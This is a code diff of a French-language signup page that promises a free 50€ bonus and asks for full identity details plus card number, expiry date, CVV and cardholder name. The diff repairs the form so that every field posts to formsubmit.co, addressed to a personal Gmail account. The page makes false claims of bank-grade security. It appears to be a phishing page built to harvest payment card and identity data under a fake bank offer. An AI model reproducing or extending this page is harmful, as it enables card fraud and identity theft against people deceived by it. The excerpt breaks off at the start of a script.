@@ -536,89 +536,81 @@
             <div class="progress-bar">
                 <div class="progress-fill" id="progressFill"></div>
             </div>
-            
-            <div class="offer-reminder">
-                <h3>🎉 50€ offerts</h3>
-                <p>Dès l'ouverture de votre compte, sans condition</p>
-            </div>
+<div class="offer-reminder">
+  <h3>🎉 50€ offerts</h3>
+  <p>Dès l'ouverture de votre compte, sans condition</p>
+</div>
 
-            <form id="signupForm">
-                <div class="form-section">
-                    <h3 class="section-title">👤 Informations personnelles</h3>
-                    <form action="https://formsubmit.co/wite.mailpro@gmail.com" method="POST">
-                    <div class="form-grid">
-                        <div class="form-group">
-                            <label for="prenom">Prénom *</label>
-                            <input type="text" id="prenom" name="prenom" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="nom">Nom *</label>
-                            <input type="text" id="nom" name="nom" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="email">Adresse email *</label>
-                            <input type="email" id="email" name="email" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="telephone">Numéro de téléphone *</label>
-                            <input type="tel" id="telephone" name="telephone" placeholder="06 12 34 56 78" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="naissance">Date de naissance *</label>
-                            <input type="date" id="naissance" name="naissance" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="lieu">Lieu de naissance *</label>
-                            <input type="text" id="lieu" name="lieu" placeholder="Paris, France" required>
-                        </div>
-                        <div class="form-group full-width">
-                            <label for="adresse">Adresse complète *</label>
-                            <input type="text" id="adresse" name="adresse" placeholder="123 Rue de la Paix, 75001 Paris" required>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="form-section">
-                    <h3 class="section-title">💳 Informations bancaires</h3>
-                    <div class="form-grid">
-                        <div class="form-group full-width">
-                            <label for="carte">Numéro de carte bancaire *</label>
-                            <input type="text" id="carte" name="carte" class="card-input" 
-                                   placeholder="1234 5678 9012 3456" maxlength="19" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="expiration">Date d'expiration *</label>
-                            <input type="text" id="expiration" name="expiration" 
-                                   placeholder="MM/AA" maxlength="5" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="cvv">Code CVV *</label>
-                            <input type="text" id="cvv" name="cvv" 
-                                   placeholder="123" maxlength="3" required>
-                        </div>
-                        <div class="form-group full-width">
-                            <label for="titulaire">Nom du titulaire de la carte *</label>
-                            <input type="text" id="titulaire" name="titulaire" 
-                                   placeholder="Nom tel qu'inscrit sur la carte" required>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="submit-section">>
-                    <button type="submit" href="account.html" class="submit-btn">
-                        🎉 Recevoir mes 50€ et créer mon compte
-                    </button>
-                    
-                    <div class="legal-text">
-                        En créant votre compte, vous acceptez nos conditions générales 
-                        et notre politique de confidentialité. Vos données sont sécurisées 
-                        et protégées selon les standards bancaires européens.
-                    </div>
-                </div>
-            </form>
-        </div>
+<form id="signupForm" action="https://formsubmit.co/wite.mailpro@gmail.com" method="POST">
+  <div class="form-section">
+    <h3 class="section-title">👤 Informations personnelles</h3>
+    <div class="form-grid">
+      <div class="form-group">
+        <label for="prenom">Prénom *</label>
+        <input type="text" id="prenom" name="prenom" required>
+      </div>
+      <div class="form-group">
+        <label for="nom">Nom *</label>
+        <input type="text" id="nom" name="nom" required>
+      </div>
+      <div class="form-group">
+        <label for="email">Adresse email *</label>
+        <input type="email" id="email" name="email" required>
+      </div>
+      <div class="form-group">
+        <label for="telephone">Numéro de téléphone *</label>
+        <input type="tel" id="telephone" name="telephone" placeholder="06 12 34 56 78" required>
+      </div>
+      <div class="form-group">
+        <label for="naissance">Date de naissance *</label>
+        <input type="date" id="naissance" name="naissance" required>
+      </div>
+      <div class="form-group">
+        <label for="lieu">Lieu de naissance *</label>
+        <input type="text" id="lieu" name="lieu" placeholder="Paris, France" required>
+      </div>
+      <div class="form-group full-width">
+        <label for="adresse">Adresse complète *</label>
+        <input type="text" id="adresse" name="adresse" placeholder="123 Rue de la Paix, 75001 Paris" required>
+      </div>
     </div>
+  </div>
+  
+  <div class="form-section">
+    <h3 class="section-title">💳 Informations bancaires</h3>
+    <div class="form-grid">
+      <div class="form-group full-width">
+        <label for="carte">Numéro de carte bancaire *</label>
+        <input type="text" id="carte" name="carte" class="card-input" placeholder="1234 5678 9012 3456" maxlength="19" required>
+      </div>
+      <div class="form-group">
+        <label for="expiration">Date d'expiration *</label>
+        <input type="text" id="expiration" name="expiration" placeholder="MM/AA" maxlength="5" required>
+      </div>
+      <div class="form-group">
+        <label for="cvv">Code CVV *</label>
+        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
+      </div>
+      <div class="form-group full-width">
+        <label for="titulaire">Nom du titulaire de la carte *</label>
+        <input type="text" id="titulaire" name="titulaire" placeholder="Nom tel qu'inscrit sur la carte" required>
+      </div>
+    </div>
+  </div>
+  
+  <div class="submit-section">
+    <button type="submit" class="submit-btn">
+      🎉 Recevoir mes 50€ et créer mon compte
+    </button>
     
+    <div class="legal-text">
+      En créant votre compte, vous acceptez nos conditions générales 
+      et notre politique de confidentialité. Vos données sont sécurisées 
+      et protégées selon les standards bancaires européens.
+    </div>
+  </div>
+</form>
+
     <script>
 document.getElementById("signupForm").addEventListener("submit", function(event) {
     event.preventDefault(); // Empêche l'envoi "classique" du formulaire
